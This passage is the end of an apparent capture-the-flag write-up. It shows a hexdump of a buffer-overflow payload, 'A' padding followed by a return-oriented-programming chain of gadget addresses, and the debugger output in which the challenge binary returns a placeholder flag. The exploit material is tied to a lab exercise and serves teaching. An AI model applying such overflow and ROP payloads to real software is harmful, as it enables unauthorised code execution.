    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  a3 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  28 10 60 00  00 00 00 00  2a 06 40 00  00 00 00 00  │(·`·│····│*·@·│····│
    00000040  00 40 00 00  00 00 00 00  c7 c4 3f 00  00 00 00 00  │·@··│····│··?·│····│
    00000050  28 06 40 00  00 00 00 00  39 06 40 00  00 00 00 00  │(·@·│····│9·@·│····│
    00000060  2a 06 40 00  00 00 00 00  00 40 00 00  00 00 00 00  │*·@·│····│·@··│····│
    00000070  e1 c2 3f 00  00 00 00 00  28 06 40 00  00 00 00 00  │··?·│····│(·@·│····│
    00000080  39 06 40 00  00 00 00 00  2a 06 40 00  00 00 00 00  │9·@·│····│*·@·│····│
    00000090  00 40 00 00  00 00 00 00  78 c4 3f 00  00 00 00 00  │·@··│····│x·?·│····│
    000000a0  28 06 40 00  00 00 00 00  39 06 40 00  00 00 00 00  │(·@·│····│9·@·│····│
    000000b0  2a 06 40 00  00 00 00 00  00 40 00 00  00 00 00 00  │*·@·│····│·@··│····│
    000000c0  7c c4 3f 00  00 00 00 00  28 06 40 00  00 00 00 00  │|·?·│····│(·@·│····│
    000000d0  39 06 40 00  00 00 00 00  2a 06 40 00  00 00 00 00  │9·@·│····│*·@·│····│
    000000e0  00 40 00 00  00 00 00 00  f5 c2 3f 00  00 00 00 00  │·@··│····│··?·│····│
    000000f0  28 06 40 00  00 00 00 00  39 06 40 00  00 00 00 00  │(·@·│····│9·@·│····│
    00000100  2a 06 40 00  00 00 00 00  00 40 00 00  00 00 00 00  │*·@·│····│·@··│····│
    00000110  72 c2 3f 00  00 00 00 00  28 06 40 00  00 00 00 00  │r·?·│····│(·@·│····│
    00000120  39 06 40 00  00 00 00 00  2a 06 40 00  00 00 00 00  │9·@·│····│*·@·│····│
    00000130  00 40 00 00  00 00 00 00  e0 c2 3f 00  00 00 00 00  │·@··│····│··?·│····│
    00000140  28 06 40 00  00 00 00 00  39 06 40 00  00 00 00 00  │(·@·│····│9·@·│····│
    00000150  2a 06 40 00  00 00 00 00  00 40 00 00  00 00 00 00  │*·@·│····│·@··│····│
    00000160  28 c2 3f 00  00 00 00 00  28 06 40 00  00 00 00 00  │(·?·│····│(·@·│····│
    00000170  39 06 40 00  00 00 00 00  a3 06 40 00  00 00 00 00  │9·@·│····│··@·│····│
    00000180  28 10 60 00  00 00 00 00  10 05 40 00  00 00 00 00  │(·`·│····│··@·│····│
    00000190  0a                                                  │·│
    00000191
[*] Switching to interactive mode
[DEBUG] Received 0x2c bytes:
    b'Thank you!\n'
    b'ROPE{a_placeholder_32byte_flag!}\n'
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$
```

And it looks like we have the flag: `ROPE{a_placeholder_32byte_flag!}`!
